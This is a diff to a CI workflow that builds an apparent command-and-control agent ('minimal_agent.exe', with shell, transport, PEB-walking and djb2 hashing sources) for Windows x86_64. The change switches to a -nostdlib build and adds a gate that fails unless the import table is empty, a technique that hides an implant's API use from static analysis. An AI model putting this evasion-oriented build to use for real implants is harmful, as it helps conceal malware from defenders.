@@ -14,9 +14,13 @@ concurrency:
 
 jobs:
   # ═════════════════════════════════════════════════════════════════════════
-  # Build — the three Windows arches the C2 Agents table tags (X86/AMD64/ARM64),
-  # cross-compiled on Linux with the llvm-mingw toolchain (gcc-compatible clang
-  # drivers + mingw-w64 import libs, e.g. -lwinhttp, for every Windows triple).
+  # Build — the dependency-free flavor (-nostdlib: empty import table, own
+  # entry point), cross-compiled on Linux with the llvm-mingw toolchain.
+  #
+  # x86_64 only, deliberately: the CRT-free entry layer is proven live on
+  # x86_64 (stack probe ___chkstk_ms, PEB layouts). i386 needs a 32-bit
+  # RTL_USER_PROCESS_PARAMETERS layout + its own stack probe; aarch64 needs
+  # an ARM64 probe. Both are future work - listed in the README.
   # ═════════════════════════════════════════════════════════════════════════
   build:
     runs-on: ubuntu-24.04
@@ -24,9 +28,7 @@ jobs:
       fail-fast: false
       matrix:
         include:
-          - { arch: i386,    triple: i686-w64-mingw32 }
           - { arch: x86_64,  triple: x86_64-w64-mingw32 }
-          - { arch: aarch64, triple: aarch64-w64-mingw32 }
     steps:
       - name: Checkout
         uses: actions/checkout@v7
@@ -65,19 +67,28 @@ jobs:
       - name: Add llvm-mingw to PATH
         run: echo "/opt/llvm-mingw/bin" >> "$GITHUB_PATH"
 
-      # Same flags as the README's local build, plus the baked identity-frame
-      # metadata (build number + commit hash) the panel displays.
+      # Same two steps as the README's local dependency-free build: compile
+      # every TU, then link with -nostdlib and our entry point. The identity
+      # metadata (build number + commit hash) is baked in as usual.
       - name: Build
         run: |
           BUILD_NUMBER=$(git rev-list --count HEAD)
           COMMIT_HASH=$(git rev-parse --short=8 HEAD)
-          echo "=== building windows-${{ matrix.arch }} (${{ matrix.triple }}-gcc) ==="
-          ${{ matrix.triple }}-gcc -O2 -s -Wall -Wextra \
+          echo "=== building windows-${{ matrix.arch }} (${{ matrix.triple }}-gcc, dependency-free) ==="
+          ${{ matrix.triple }}-gcc -O2 -Wall -Wextra \
               -DID_BUILD_NUMBER="$BUILD_NUMBER" \
               -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
-              -o minimal_agent.exe main.c transport.c shell.c report.c system_facts.c \
-              winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
-              peb.c system.c djb2.c logger.c -ladvapi32
+              -c main.c transport.c shell.c report.c system_facts.c \
+                 winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
+                 peb.c system.c djb2.c logger.c entry.c
+          ${{ matrix.triple }}-gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe \
+              entry.o main.o transport.o shell.o report.o system_facts.o \
+              winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
+              peb.o system.o djb2.o logger.o
+          # Gate: the whole point of this flavor - an EMPTY import table.
+          if ${{ matrix.triple }}-objdump -p minimal_agent.exe | grep -q "DLL Name"; then
+            echo "FAIL: import table is not empty"; exit 1
+          fi
           mkdir -p artifacts
           cp minimal_agent.exe "artifacts/windows-${{ matrix.arch }}.exe"
           ls -la artifacts/
